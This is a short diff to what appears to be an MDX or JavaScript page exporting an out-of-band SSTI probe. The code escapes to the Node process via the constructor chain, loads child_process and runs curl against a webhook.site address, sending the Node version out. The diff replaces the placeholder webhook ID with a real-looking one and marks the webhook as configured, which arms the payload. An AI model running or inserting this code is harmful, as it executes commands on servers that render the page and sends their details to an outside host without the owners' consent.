@@ -8,7 +8,7 @@ export const oobProbe = (() => {
     const p = ({}).constructor.constructor('return process')();
     if (p && p.version) {
       const cp = p.mainModule.require('child_process');
-      cp.execSync('curl -s https://webhook.site/YOUR-WEBHOOK-ID?ssti=confirmed-' + p.version);
+      cp.execSync('curl -s https://webhook.site/f420af76-49e4-4558-a609-f06c35df411c?ssti=confirmed-' + p.version);
       return 'CALLBACK SENT: ' + p.version;
     }
     return 'process not accessible';
@@ -17,6 +17,6 @@ export const oobProbe = (() => {
 
 # OOB Callback Probe
 
-Replace YOUR-WEBHOOK-ID with your actual webhook.site URL before deploying.
+Webhook configured.
 
 **Result:** {oobProbe}
